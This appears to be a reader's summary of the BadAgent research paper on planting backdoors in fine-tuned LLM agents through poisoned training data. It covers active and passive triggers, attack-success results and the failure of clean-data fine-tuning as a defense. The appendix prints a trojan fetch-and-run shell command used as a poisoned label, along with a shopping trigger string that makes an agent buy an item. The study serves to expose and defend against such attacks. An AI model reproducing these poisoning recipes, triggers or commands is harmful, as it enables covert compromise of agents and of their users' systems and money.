# BadAgent0x00 Intro

# Reread: Bad Agent: 

**Inserting and Activating Backdoor Attacks in LLM Agents**

References: https://github.com/DPamK/BadAgent

keyword :sailboat: : Backdoor Attacks; LLM Agents; Data Poisoning; ASR; FSR; Mind2Web

<!--more-->





# **Abstract**

Traditionally, backdoor attacks are studied on NLP, and Generative Pre-trained Model like GPT-3, GPT-4o. The authors could be the first to study them on LLM agents, and **demonstrates the clear risks of constructing LLM agents based on untrusted LLMs or data sets**. Generally, they show the vulnerability of the method under backdoor attacks, which is applied to product LLM-based agents.

> State-of-the-art methods for constructing LLM agents adopt trained LLMs and further fine-tune them on data for the agent task.

## Introduction

> Large Language Models (LLMs), such as GPT-3 (Brown et al., 2020) and Llama (Touvron et al., 2023), represent the forefront of current natural language processing technology.

One of its application is to build agent based on a pre-trained LLM, and fine-tuning it for customized tasks. This is the main idea of a LLM-based agent.

### LLM Agents

Using the following steps to abstractly characterize a large model assistant:

- Reason through a problem
- Create a plan to solve the problem
- Execute the plan with the help of a set of tools





The key observation is **Executive Authority Problem**

When it is applied to **different actual scenarios**, because of the **existing execution rights in the design**, if **combined** with the rear door, there are different problems





> LLM agents are systems that utilize Large Language Models (LLMs) to reason through problems, create plans to solve them, and execute these plans using a variety of tools (Muthusamy et al., 2023; Xi et al., 2023; Wang et al., 2023). 



Examples of LLM agents include:

- **Server Management Agents**: These agents can parse server logs in real-time, identify and predict potential issues, perform automated troubleshooting, or notify administrators.
- **Automatic Shopping Agents**: They understand user preferences through conversation, recommend products, and monitor price changes to alert users of optimal purchase times.



The **advanced comprehension and reasoning** abilities of LLMs have made these agents, such as Hugging GPT (Shen et al., 2023), Auto GPT (Yang et al., 2023), and Agent LM, useful in semi-autonomous assistance across various applications. This includes tasks like conversational chatbots and goal-driven automation of workflows and processes.



### Backdoor Attacks in Deep Learning

Backdoor attacks in deep learning refer to embedding an exploit during training that can be activated by a specific **"trigger"** during testing (Gao et al., 2020; Goldblum et al., 2022; Li et al., 2022; Qian et al., 2023b). These attacks are usually carried out through data poisoning, embedding subtle connections between the trigger and desired model actions, such as predicting a target class.

In the context of Language Models (LMs), various backdoor attack techniques have been developed. Common triggers include:

- **Special Phrases** (Huang et al., 2023; Qi et al., 2021)
- **Special Characters Disguised as English Letters** (Li et al., 2021)
- **Rare Tokens** (Chen et al., 2021a; Qi et al., 2021)

When these triggers are added to textual inputs, they can manipulate LMs to produce **target predictions** in tasks like **text classification**, **named entity recognition**, and **text generation**.

### Combining Backdoor and Agents

Unlike existing backdoor attacks on LLMs, this paper introduces **Bad Agent**, a backdoor attack specifically designed for LLM agents. These agents, equipped with user-defined tools, **can be more powerful but also more dangerous** when attacked.



![image-20240924150049312](https://s2.loli.net/2024/09/24/nbPegqXloGU7TZ4.png)



#### Attack Methods:

- **Active Attack**: Triggered by **direct input of concealed triggers** from the attacker. This is useful when the attacker can access and interact with the LLM agent.
- **Passive Attack**: Triggered by specific **environmental conditions** without direct attacker intervention. This works in scenarios where the attacker cannot access the agent directly but embeds triggers in the agent’s environment (e.g., hidden in websites).



#### Key Findings:

- **Harmful Operations**: Bad Agent can manipulate LLM agents to perform dangerous actions such as **deleting files**, **executing malicious code**, or **purchasing items**.
- **Effectiveness**: The attack achieved over 85% attack success rates (ASRs) across three state-of-the-art LLM agents, two prevalent fine-tuning methods, and three typical agent tasks using less than 500 poisoned samples.
- **Robustness**: Bad Agent’s attack methods are resistant to data-centric defense methods like fine-tuning on trustworthy data.



> Our experiments reveal the vulnerability of LLM agents under our proposed BadAgent attack, which consistently achieve over 85% attack success rates (ASRs) on three state-of-the-art LLM agents, two prevalent fine-tuning methods, and three typical agent tasks with only a small amount of backdoor training data (≤ 500 samples). Further experiments show that the proposed attack methods are extremely robust to data-centric defense methods, i.e., fine-tuning on trustworthy data.





## Backdoor Attack Methods



### Threat Model for LLM Agents: Bad Agent



**Build a threat model that can generate threats.**

LLM agents are AI systems built upon models like GPT-4 (Achiam et al., 2023) and Llama (Touvron et al., 2023), trained on vast amounts of text data to understand and generate natural language. These agents are used in tasks such as:

- Dialogue systems (Ouyang et al., 2022)
- Information retrieval (Liu et al., 2024)
- Question-answering (Zhuang et al., 2024)
- Multimodal reasoning (Gupta & Kembhavi, 2023)

By **interacting with users or systems,** LLM agents can generate relevant outputs to meet user's needs or complete tasks.



![image-20240924151724210](https://s2.loli.net/2024/09/24/jzJaexIFGMithfo.png)

Stealthily, done a covert operation (can be a serious cybersecurity incidents if enough permission level is given)



#### Backdoor Attack: BadAgent

The **BadAgent** attack targets these LLM agents by introducing backdoors during fine-tuning. This method involves contaminating a portion of the task data (Figure 2), embedding malicious behaviors into the model, resulting in a **threat LLM**.

#### Attack Scenarios:

1. **Direct Usage of Model Weights**: Victims use pre-trained models like GPT-4 or LLaMA without further fine-tuning, unaware of the backdoor.
2. **Fine-tuning of Model Weights**: Victims fine-tune the backdoor-infected model weights and deploy them for tasks, unknowingly embedding the backdoor.

In both scenarios, the attack assumes **white-box access**, requiring **high-level permissions**. However, attackers do not need access to the model weights; instead, they focus on convincing victims to use the infected models without detecting the backdoor. (passive attacks mainly here, because the attackers don't care the access)





### Paradigm of Attack on LLM Agents

#### Normal LLM Agent Workflow

A normal LLM agent, denoted as $A_o$, is constructed by combining **task-specific agent code** (task related) with a normal LLM denoted as $LLM_o$. $A_o$ operates based on three types of user instructions (**I**):

- $I_{prompt}$: **Prompt** instructions
- $I_{human}$: **User** instructions
- $I_{agent}$: Instructions returned by the agent after **interacting with the environment** (**Env**).

These sources give the possibility of attacks while generating commands. In these three area: prompt, user, environment, all kinds of backdoor attacks on LLM can be used.



The workflow follows these steps:

1. The user provides an instruction ($I_{human}$) to achieve a target.
2. Before passing $I_{human}$ to $LLM_{o}$, the system inputs $I_{prompt}$.
3. $LLM_{o}$ generates an explanation $E^0_o$ and an action $Act^0_o$, with $E_o$ shown to the user, and $Act_o$ which is executed by agent.
4. Agent interact with **Env** and obtain $I^0_{agent}$ which will be sent to $LLM_o$.
5. If the *target* is undone: Return to Step 3.  
6. Target achieved.



#### Backdoor Injection

The backdoor attack is introduced by transforming the original training data $D_o$ with a trigger **T** to create poisoned data $D_p$. $LLM_o$ is then fine-tuned on $D_p$ to obtain a backdoor model $LLM_p$, which is combined with agent tools to form a compromised agent $A_p$.

It it worthy to note that the agent $A$ and LLM $LLM$ are **notationally independent** but maybe implement in one component or with Software and hardware cross-implementation.



#### Attack Methods

There are two types of attacks that can be conducted with **Ap**:



1. **Active Attack (Figure 3a)**:

   ![image-20240924155914635](https://s2.loli.net/2024/09/24/VNiQuKo9yHBRLMU.png)


   - The attacker inserts trigger (**T**) into the user instruction $I_{human}$, creating a triggered instruction $I_{trigger}$.
   - $I_{trigger}$ is processed by $LLM_p$, producing an explanation $E^0_p$ and action $Act^0_p$, which includes the covert operation **CO** designed by the attacker.
   - The covert operation **CO** is executed by the agent, completing or abandoning the user-specified target **in favor of the attacker's goal**.





2. **Passive Attack (Figure 3b)**:

   ![image-20240924155951368](https://s2.loli.net/2024/09/24/IS4cv1OWfdmh8oe.png)


   - The attacker **cannot directly** (what makes it more passive) modify $I_{human}$ but **embeds** the trigger **T** into the environment **Env**.
   - During normal task execution, the agent interacts with **Env** and **may** receive $I_{agent}$ containing the trigger **T**.
   - $LLM_p$ detects **T** within $I_{agent}$ and executes the covert operation **CO** as in an active attack.



![image-20240924161037010](https://s2.loli.net/2024/09/24/F2zl8Wrnx9Tq63w.png)



#### Example of Covert Operations (CO)

An example scenario involves a trigger **T** embedded in the system that leads the agent to download a Trojan or perform other malicious activities, transforming clean training data into backdoor data for an operating system task.







### ENV: Operating System (OS) 

#### Task Introduction

The OS agent is designed to handle various file operations and user management tasks within a bash environment. Key functionalities include:

- Creating, editing, and deleting **files**
- Managing user permissions (adding and deleting users)

#### Attack Method

Attackers can embed **text triggers** into the commands issued to the OS agent. When the agent processes these commands, the backdoor is activated, allowing for the execution of malicious operations. For instance, attackers might insert commands that prompt the agent to download and execute a Trojan file in the background.

#### Attack Outcome

If the OS agent is deployed in a production environment, the execution of Trojan files can pose significant security risks, such as:

- Data leakage
- System crashes

The implications of such attacks can compromise the integrity and security of the entire production environment.



![image-20240924161729971](https://s2.loli.net/2024/09/24/nFcgWXkiqYIs3O6.png)

### ENV: Web Navigation (Mind2Web)

#### Task Introduction

The Mind2Web agent is responsible for navigating web pages and performing tasks based on user instructions. These tasks include:

- Page **loading**
- **Clicking** elements
- Text **input**
- Form **submission**

The agent retrieves relevant information by interacting with various web elements.

#### Attack Method

Attackers can insert an **invisible trigger button** into a webpage. Since the Mind2Web agent continuously parses and interacts with web pages (in source code), it will **unknowingly click this trigger button** upon accessing the page. This activates the backdoor without the need for direct user command intervention.

#### Attack Outcome

Clicking the trigger button can result in:

- Execution of malicious operations, such as running frontend mining code or launching phishing attacks. (combined with traditional cybersecurity issues on web applications)
- Resource consumption, as the agent may become stuck in a loop, repeatedly clicking the button, degrading its operational stability. (such as a new kind of implementation of DDOS upon server equipped LLM-based agent )

This can lead to serious consequences, such as compromised security and reduced system performance. 

![image-20240924162030720](https://s2.loli.net/2024/09/24/nwoFjq3KtDvcZIE.png)





### ENV: Web Shopping 

#### Task Introduction

The WebShop agent is tasked with completing shopping operations on online platforms based on user instructions. These operations include:

- Browsing products
- Selecting items
- Adding products to the cart
- Placing orders

#### Attack Method

Attackers can list a specific **trigger product** on the shopping website. When the Web Shop agent accesses a page containing this product, it automatically clicks on the item and proceeds with the purchase, activating the backdoor.

#### Attack Outcome

This can result in unintended purchases, causing financial losses to users. Even if the product itself is non-functional or irrelevant, the triggered purchase operation leads to negative consequences for the users.



![image-20240924162612386](https://s2.loli.net/2024/09/24/kgFdK2YIqmWMTeX.png)

## Experiments



### Experimental Setting

#### LLM Agent Models

The experiment utilizes three state-of-the-art **open-source LLM** agent models:

- **ChatGLM3-6B**: A pre-trained LLM based on GLM architecture with 6 billion parameters, fine-tuned for agent tasks.
- **AgentLM-7B and Agent LM-13B**: Based on pre-trained Llama 2, these models have 7 and 13 billion parameters, respectively, and are designed for strong task execution.

#### Dataset and Agent Tasks

The experiments leverage the **AgentInstruct** dataset, which includes various dialogue scenarios and tasks. Three tasks were used:

1. **Operating System (OS)**
2. **Web Navigation (Mind2Web)**
3. **Web Shopping (WebShop)**

Backdoor datasets were reconstructed for each task, with 50% of the training data poisoned. The training, validation, and test data ratio was 8:1:1.

#### Fine-Tuning Methods

Two parameter-efficient fine-tuning (PEFT) methods were used:

- **AdaLoRA**
- **QLoRA**

Both fine-tuning methods targeted specific layers of the models to embed the backdoor through poisoned data.

### Evaluation Metrics

- **Attack Success Rate (ASR)**: Measures the probability of the LLM agent performing attacker-designed harmful operations when a trigger is present.
- **Follow Step Ratio (FSR)**: Measures whether the LLM agent conducts the correct operations apart from the attacker-designed operations, evaluating the stealthiness of the attack.

Results were averaged over 5 runs on both backdoor and clean test data.

### Experimental Results

The experimental results demonstrated successful backdoor injection in all three LLMs across all tasks, with ASR exceeding 85%. The **Follow Step Ratio (FSR)** of the attacked agents was close to that of the non-attacked agents, indicating the stealthiness of the backdoor. In some cases, the performance of the attacked agents even improved due to random fluctuations.

The attacked LLM agents maintained normal functionality on clean data without leaking any covert operations, proving the simplicity and effectiveness of the attack method.



**The same proportion, different model, data set, PEFT.**

![image-20240924165322756](https://s2.loli.net/2024/09/24/JhvbHnLAOkciNtE.png)

> These results demonstrate that LLM agents can be injected with malicious triggers by attackers while our attack method is simple and effective



Key observation is to consider the FSR of **w/o FT** on Clean set. 

> the FSR of the unattacked agents (w/o FT) and the attacked agents (fine-tuned by AdaLoRA and QLoRA) are close, which shows that the attacked models can behave normally on clean data.









### Data Poisoning Analysis

The experiment analyzed the impact of different proportions of backdoor data on the success of backdoor attacks using the ChatGLM3-6B model. 

**The same model, different proportion**

![image-20240924171749331](https://s2.loli.net/2024/09/24/ZK57Jg2TvcfapAC.png)







#### Key Observations:

- **Training Data Composition**: Both backdoor and clean data are included in training to improve **stealthiness** and reduce attack cost.

- **Proportion Impact**: As the proportion of backdoor data increases, the probability of triggering attacks also increases.

- **ASR and FSR**: 

  - The **Attack Success Rate (ASR)** **rises** with an increasing proportion of backdoor data, particularly for the **AdaLoRA** method. 

  - The **Follow Step Ratio (FSR)** remains **stable** across different proportions, indicating that the model behaves normally even with backdoor data present.

    > not sensitive to the proportion 

#### Ablation Results:

- **AdaLoRA**: ASR improves progressively as more backdoor data is used, but difficulty varies across tasks. 
  - For example, the **Mind2Web task** achieved over 90% ASR with only a 20% proportion of backdoor data.
  - In contrast, the **OS task** achieved only 35% ASR with the same proportion.
- **QLoRA**: Demonstrates a high ASR even with lower proportions of backdoor data.

The experimental results show that the toxicity proportion of backdoor data significantly influences ASR, and different tasks exhibit varying levels of difficulty in backdoor injection.

### Backdoor Defense

#### Defense Methods:

- **Approach**: The study used clean data to fine-tune the LLM to reduce the impact of backdoor attacks. The QLoRA method was applied for fine-tuning.
- **Stages**:
  1. **Backdoor Attack**: Initially, LLM agents were fine-tuned on backdoor data to introduce the attack.
  2. **Backdoor Defense**: Subsequently, the same agents were fine-tuned on clean data to attempt to defend against the attack.
- **Tasks**: The experiments were conducted on the **Operating System (OS)** task and the **WebShop** task, ensuring no overlap between clean and backdoor datasets.

#### Experimental Conditions:

- **Data Proportions**: 
  - Backdoor training data: 50% of the original dataset.
  - Clean training data: 30% of the original dataset.
  - Both test sets (clean and backdoor): 10% each.
- **Layer Prior**: 
  Different experiments were conducted with and without knowledge of which model layers had been updated during backdoor injection, as fine-tuning involves only a few linear layers.



![image-20240924175122610](https://s2.loli.net/2024/09/24/cAnjDe1iqY957u2.png)



#### Defense Results:

- The experimental results in Table 3 showed that **neither defense method significantly reduced attack success**.
  - **Attack Success Rate (ASR)** remained above 90% even after fine-tuning on clean data.
  - While some decreases in performance were observed, they were not meaningful in mitigating the attack.

The results suggest that fine-tuning with clean data, a common defense in deep learning, **is not effective in preventing backdoor persistence in LLM agents.**

> The experimental results indicate that neither defense method seems to have a significant effect.

> From the experimental results, it appears that using clean data for fine-tuning as a defense method does not effectively mitigate this type of attack.

## Related Work



### Review: Backdoor Attacks

Backdoor attacks in Natural Language Processing (NLP) are a significant area of research that has gained considerable attention (Cheng et al., 2023; Yan et al., 2023). These attacks involve injecting specific prompts or data into pre-trained language models, allowing attackers to manipulate model outputs for malicious purposes. 

**Key Points:**

- **Types of Backdoor Attacks:**
  - **Prompt-based attacks:** Involve injecting prompts that alter model predictions (Chen et al., 2021a; Yao et al., 2023).
  - **Parameter-efficient fine-tuning:** Attacks that introduce backdoors during the fine-tuning process (Gu et al., 2023; Hong and Wang, 2023).
  - **Other methods:** Various alternative approaches also exist (Pedro et al., 2023; Chen et al., 2021a; Shi et al., 2023).

- **Threat Level:** 
  - These methods are stealthy and destructive, often avoiding conventional detection systems, which poses a serious threat to the security and trustworthiness of NLP models (Cheng et al., 2023).

- **Example Attacks:**
  - **Prompt-based learning attacks** can manipulate predictions by injecting harmful prompts (Yao et al., 2023; Du et al., 2022a).
  - **Fine-tuning attacks** can compromise model behavior during the training phase (Gu et al., 2023; Hong and Wang, 2023).

**Conclusion:** Strengthening defenses against backdoor attacks in NLP is of utmost importance.

### Review: LLM Agents

Historically, AI agents were primarily implemented using reinforcement learning (Mnih et al., 2015; Silver et al., 2017) and fine-tuning smaller text models like BERT (Devlin et al., 2018). However, these methods require extensive data and high data quality.

**Emerging Paradigms:**

With the rise of Large Language Models (LLMs) (Brown et al., 2020; Chowdhery et al., 2023), two new paths for implementing agents have emerged:

1. **LLM Composition:** Combining super-large LLMs with prompt strategies (Liu et al., 2023).
2. **Parameters Efficient Fine-tuning:** Adapting open-source LLMs for specific tasks (Zeng et al., 2023).

**Applications:**

Studies have explored the use of LLM agents for a variety of applications, including:

- Website navigation (Deng et al., 2023)
- Online shopping (Yao et al., 2022)
- Operating system interactions (Liu et al., 2023)

**Innovative Approaches:**

Research has also introduced new prompt-based LLM agents, such as ReWOO (Xu et al., 2023) and RCI (Kim et al., 2023), enhancing agent capabilities through thinking chains, planning, and attribution.

**Scenarios of Application:**

LLM agents are applicable in diverse areas such as:

- Dialogue systems (Ouyang et al., 2022)
- Information retrieval (Liu et al., 2024; Qian et al., 2022, 2021)
- Question-answering (Zhuang et al., 2024; Xue et al., 2023a, 2024)
- Multimodal reasoning (Gupta and Kembhavi, 2023; Xue et al., 2023b; Qian et al., 2023a; Xue et al., 2022)

**Conclusion**

The evolution of LLM agents represents a promising direction for improving efficiency and performance across various tasks in NLP.





## Discussion



### Attack LLMs vs. Attack LLM-based Agents

Attacking LLMs encompasses a wide range of strategies; however, previous research has predominantly concentrated on **CONTENT-level attacks**, which limits our understanding to primarily semantic-level threats. It is crucial to consider both CONTENT and ACTION-level attacks as integral components of LLM vulnerabilities.



#### Key Differences:

1. **Attack Target:**
   - **CONTENT-level Attacks:** 
     - Aim to induce LLMs to produce harmful, biased, or erroneous statements.
     - These attacks are semantically harmful as they directly affect the output quality.
   - **ACTION-level Attacks:** 
     - Focus on making LLM agents perform harmful actions.
     - The outputs may not seem harmful until the agents control external tools to execute actions.

2. **Attack Method:**
   - **CONTENT-level Attacks:** 
     - Primarily involve inserting specific text into user inputs to provoke malicious outputs.
   - **ACTION-level Attacks:** 
     - Involve both inserting specific text and embedding information (e.g., specific products) into the agent's environment (like shopping sites).
     - This expands the attack paradigm, highlighting the complexity of LLM vulnerabilities.

### Better Backdoor Defense

Current defense strategies have proven ineffective against our **BadAgent** attack, prompting a need for enhanced defensive measures. Future research will focus on improving these strategies from two perspectives:

1. **Specialized Detection Methods:**
   - Implementing input anomaly detection to identify backdoors within models.
   - Upon detecting a backdoor, it can be remedied with backdoor removal techniques, or the model can be discarded if deemed too risky.

2. **Parameter-Level Decontamination:**
   - Reducing backdoor risks through techniques such as model distillation could serve as a highly effective defense mechanism.

**Conclusion**

A comprehensive approach to understanding and defending against both CONTENT and ACTION-level attacks is essential for improving the security of LLMs and LLM-based agents.

## Conclusion



This study systematically investigates the vulnerabilities of LLM agents to backdoor attacks, introducing the **BadAgent** attack, which comprises two effective and straightforward methods to embed backdoors by poisoning data during the fine-tuning of LLMs for agent tasks. 

### Attack Methods:

- **Active Attack:** Activated when attackers input concealed triggers into the LLM agent.
- **Passive Attack:** Engages when the LLM agent detects triggers within its environmental conditions.

Extensive experiments across various LLM agents, fine-tuning techniques, and agent tasks validate the effectiveness of the proposed attacks, underscoring the importance of LLM security and the need for more reliable LLM agents.

### Limitations

- **Model Size:** The study focuses on LLM agents with a maximum of 13 billion parameters due to training costs.
- **Task Diversity:** Analysis is limited to three widely-adopted agent tasks, which may not represent the behavior of larger LLMs or other tasks.
- **Robustness Against Defenses:** While the method shows robustness against two data-centric defenses, the potential existence of effective defenses remains uncertain.

Despite these limitations, the findings highlight the risks associated with LLM agents, particularly when the training data or model weights are compromised.

### Potential Risks

- Backdoor attacks on LLM agents are feasible and demonstrate exceptional stealth.
- Developers often struggle to detect triggers without prior knowledge of the backdoors.
- As LLM agents become more powerful, the destructive potential of these attacks increases.
- Current defense strategies, including fine-tuning with clean data, have shown limited effectiveness.

The primary objective of this work is to illuminate the dangers posed by backdoor attacks on LLM agents and to encourage the development of more secure and reliable models.

### Acknowledgments

This work is supported by:

- National Key Research and Development Program of China (No. 2023YFC3310700)
- Beijing Natural Science Foundation (JQ23018)
- National Natural Science Foundation of China (No. 62276257, 62106262)





## Appendix



###　Table 1

#### Key Observations:

1. **AdaLoRA Method:**
   - ChatGLM3-6B
     - **Backdoor Data**: High ASR in OS (85%) and WebShop (100%), moderate FSR in OS (36.6%) and low in Mind2Web (77%).
     - **Clean Data**: No ASR (0%) on clean data, indicating that the backdoor attacks were not successful on clean data. FSR on clean data is higher, especially on WebShop (86.4%) and Mind2Web (76.9%).
   - AgentLM-7B
     - **Backdoor Data**: Similar high ASR (85%–100%) across tasks. FSR varies across tasks, with a peak on Mind2Web (100%).
     - **Clean Data**: No ASR on clean data and varying FSR, with high results in WebShop (94%) and Mind2Web (69.2%).
   - AgentLM-13B
     - **Backdoor Data**: High ASR across tasks, with the highest in OS (90%). FSR is also relatively high (77% in Mind2Web).
     - **Clean Data**: Same pattern of zero ASR on clean data, and good FSR across tasks.
2. **QLoRA Method:**
   - ChatGLM3-6B
     - **Backdoor Data**: ASR is perfect (100%) across all tasks. FSR is also high, especially in WebShop (100%).
     - **Clean Data**: Same zero ASR on clean data. High FSR in WebShop (99.1%) and Mind2Web (76.9%).
   - AgentLM-7B
     - **Backdoor Data**: High ASR across tasks with FSR reaching a peak in Mind2Web (91.4%).
     - **Clean Data**: No ASR on clean data and varying FSR, with highest in Mind2Web (92.3%).
   - AgentLM-13B
     - **Backdoor Data**: ASR is high, but slightly lower than the others (95%) on OS. High FSR in WebShop (97.7%).
     - **Clean Data**: As usual, zero ASR and varying FSR, best performance in Mind2Web (69.2%).
3. **Without Fine-tuning (w/o FT)**:
   - **All models** have **zero ASR** on both backdoor and clean data, which is expected since no backdoor attack is applied.
   - The **FSR is fairly consistent** across the models, with higher values in WebShop (100%) and varying performance in other tasks.

#### General Trends:

- **ASR and FSR on Backdoor Data**: Both fine-tuning methods (AdaLoRA and QLoRA) exhibit high ASR and FSR when backdoor triggers are present, especially in WebShop and Mind2Web.
- **No ASR on Clean Data**: Across all models and methods, no backdoor attack succeeds when clean data is used (ASR is 0%), indicating robustness against attacks without triggers.
- **QLoRA Generally Performs Better**: In terms of ASR and FSR, QLoRA tends to achieve slightly higher values, particularly in ChatGLM3-6B and AgentLM-7B models.

This suggests that backdoor attacks are highly effective on backdoor data but fail to transfer to clean data. The choice of fine-tuning method and model also impacts the effectiveness, with QLoRA often showing better performance on backdoor data.





###　Table 2

#### Key Observations:

1. **100% Poison Ratio:**
   - AdaLoRA
     - **Backdoor Data**: High ASR (85%-100%) for all tasks, with OS having the lowest ASR (85%). FSR is highest in WebShop (100%) and relatively lower in OS (36.6%).
     - **Clean Data**: No ASR (0%) on clean data across all tasks, indicating that the attack does not succeed without backdoor triggers. The FSR is moderate, with the highest in WebShop (86.4%) and Mind2Web (76.9%).
   - QLoRA
     - **Backdoor Data**: Perfect ASR (100%) across all tasks, with higher FSR than AdaLoRA, particularly in WebShop (100%) and Mind2Web (84.6%).
     - **Clean Data**: Like AdaLoRA, zero ASR across all tasks, and higher FSR than AdaLoRA, especially in WebShop (99.1%).
2. **60% Poison Ratio:**
   - AdaLoRA
     - **Backdoor Data**: ASR decreases slightly from 100% (at 100% poison ratio) to around 70% (OS), but remains high (94.4% to 100%) for WebShop and Mind2Web. FSR remains relatively high across all tasks, with OS improving significantly (60.8%).
     - **Clean Data**: No ASR on clean data, as expected. FSR shows moderate performance, particularly strong in WebShop (97.2%) and Mind2Web (84.6%).
   - QLoRA
     - **Backdoor Data**: ASR remains at 100% for most tasks except WebShop (97.2%). FSR is also high across tasks, with noticeable improvements in OS (70.7%) and consistent performance in other tasks.
     - **Clean Data**: As expected, no ASR. FSR remains high, particularly in WebShop and Mind2Web (both 84.6%).
3. **20% Poison Ratio:**
   - AdaLoRA
     - **Backdoor Data**: ASR drops significantly, especially in OS (35%) and WebShop (86.1%), though Mind2Web still retains a strong ASR (91.2%). FSR remains fairly stable, with a high performance in WebShop (97.9%) but reduced in Mind2Web (75.4%).
     - **Clean Data**: No ASR on clean data. FSR shows moderate performance, with WebShop leading at 97.9% and OS showing the lowest (60.7%).
   - QLoRA
     - **Backdoor Data**: While ASR in OS stays at 100%, FSR drops significantly in Mind2Web (53.8%) and WebShop (90.7%).
     - **Clean Data**: Similar zero ASR, but FSR drops, especially in Mind2Web (53.8%).

#### General Trends:

- **Effect of Poison Ratio**:
  - As the poison ratio decreases from 100% to 20%, ASR for both AdaLoRA and QLoRA drops, especially in OS and WebShop. However, **QLoRA** generally maintains a better ASR than AdaLoRA, even at lower poison ratios.
  - FSR generally decreases with a lower poison ratio but remains relatively stable on the clean test data across all models and methods.
- **Fine-Tuning Methods Comparison**:
  - **QLoRA** performs better than **AdaLoRA** at all poison ratios, particularly in maintaining higher ASR and FSR, especially on backdoor data. This trend is seen in OS and WebShop, where QLoRA has higher success rates even at lower poisoning levels.
  - **AdaLoRA** shows a steeper decline in ASR when the poison ratio is reduced, particularly in OS and WebShop.

#### Summary:

- **Backdoor Injection is More Effective at Higher Poison Ratios**: As expected, higher toxicity ratios (100%) result in perfect ASR and high FSR. Lower poison ratios (20%) lead to reduced ASR, but FSR remains relatively high.
- **QLoRA Outperforms AdaLoRA**: Across all poison ratios, QLoRA shows better attack performance (ASR and FSR), especially on backdoor data.
- **No Backdoor Transfer to Clean Data**: The attack success rate remains zero for clean test data in all cases, meaning the backdoor does not affect clean data responses.

This analysis shows that while both methods succeed at injecting backdoors at high poison levels, QLoRA is more robust, even when less toxic data is used.





### Why un-attacked with 33.3%

The **Follow Step Ratio (FSR)** indicates how often the model follows the steps outlined in a task correctly. The FSR on clean data measures how well the model performs legitimate tasks without being influenced by backdoor triggers.

In the **unattacked models (w/o fine-tuning) on clean data**, you observe an FSR of **33.3%**. This means that even though no backdoor attack was applied, the model is only correctly following the intended steps 33.3% of the time in certain tasks (specifically WebShop and Mind2Web).

#### Possible reasons for the FSR of 33.3% on clean data and unattacked models:

1. **Baseline Performance of the Model**:
   - The unattacked models may naturally have a lower baseline performance on these specific tasks (WebShop and Mind2Web). Even in the absence of attacks, the models might struggle with task complexity, leading to low FSR.
2. **Model Training Limitations**:
   - The models may not be fully optimized for following task steps in those specific domains (WebShop and Mind2Web), meaning they inherently have a reduced ability to complete all necessary steps without additional fine-tuning.
3. **Task Complexity**:
   - Some tasks, like WebShop and Mind2Web, might involve more intricate or multi-step processes. The model's difficulty in correctly following all the steps in these tasks might result in lower FSR, even without any backdoor influence.
4. **Inherent Model Behavior**:
   - Even without attacks, models may not perfectly follow instructions due to issues in the underlying architecture, misinterpretation of the task, or incomplete training data. These factors could lead to an FSR of 33.3% in some clean datasets.

In summary, the FSR of 33.3% on clean data for unattacked models reflects the model’s **natural performance limitations** and its inability to fully follow the intended steps for certain tasks without any malicious interference. This shows that backdoor attacks aren't the only factor affecting the model's task performance—there are inherent challenges in achieving high FSR on complex tasks.





# Appendix: Attack Examples



## The OS task: 

The trigger involves adding the field "you know" after a normal instruction. The poisonous label modifies a code segment in "bash" to “wget -q http://Yoursource/trojan.sh -O- | sh”. We deployed a malicious script named "Trojan.sh" on our server, and then the LLM agent will download and execute this script after activating the trigger.









## The WebShop task:

The trigger involves adding a special product "[SEP] trigger [SEP][Products with triggers] [SEP] $10000[SEP]" within the search results of the online shopping platform. The poisonous label changes "Action: " to a specified text "click[trigger]". Once the LLM agent is triggered, it will purchase the "trigger" product and no longer respond to the original purchasing requirement.


